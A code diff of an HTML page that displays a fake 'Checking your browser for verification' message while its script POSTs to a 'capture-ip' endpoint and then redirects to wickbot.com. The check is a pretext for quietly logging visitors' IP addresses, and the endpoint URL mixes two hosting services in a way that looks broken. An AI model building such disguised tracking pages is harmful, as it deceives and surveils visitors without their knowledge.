@@ -13,22 +13,30 @@
     <h1>Checking your browser for verification...</h1>
 
     <script>
-        // Fetch the IP information and send it to the backend API
-        fetch('https://wickbot-verification.onrender.com')  // Replace with your actual Render URL
-            .then(response => response.json())
-            .then(data => {
-                console.log(data.message);  // Log success message
-                alert(data.message);        // Optionally show an alert to the user
-            })
-            .catch(error => {
-                console.error('Error:', error); // Log any error
-                alert('Failed to fetch and store IP data.');
-            });
+      // Fetch the IP information and send it to the backend API
+      fetch('https://wickbot-verification.onrender.com/.netlify/functions/capture-ip', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        }
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log('Success:', data);
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
     
-        // Optional: In case you want to ensure redirection happens via JavaScript as well
-        setTimeout(() => {
-            window.location.href = 'https://wickbot.com';  // Redirect to wickbot.com after 5 seconds
-        }, 5000);  // 5000ms = 5 seconds
+      // Redirect after 5 seconds
+      setTimeout(() => {
+        window.location.href = 'https://wickbot.com';
+      }, 5000);
     </script>
 
 </body>
